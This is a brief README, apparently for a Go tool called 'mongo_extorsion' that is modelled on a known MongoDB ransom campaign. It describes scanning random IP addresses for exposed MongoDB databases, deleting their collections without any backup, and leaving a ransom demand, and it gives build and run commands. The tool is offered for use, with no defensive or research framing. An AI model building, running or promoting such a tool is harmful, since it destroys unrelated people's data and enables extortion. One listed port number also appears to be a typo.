# Mongo extorsion

Inspired from the "READ_ME_TO_RECOVER_YOUR_DATA" mongo "ransomware".

It will scan random ips and check for unprotect mongo dbs on ports 27107 & 27018.
When found mongodb **it will backup nothing**, it will only delete collections and ask for a ransom.

### Build

```
go build  -ldflags="-w -s"
```

### Run

```sh
./mongo_extorsion
```
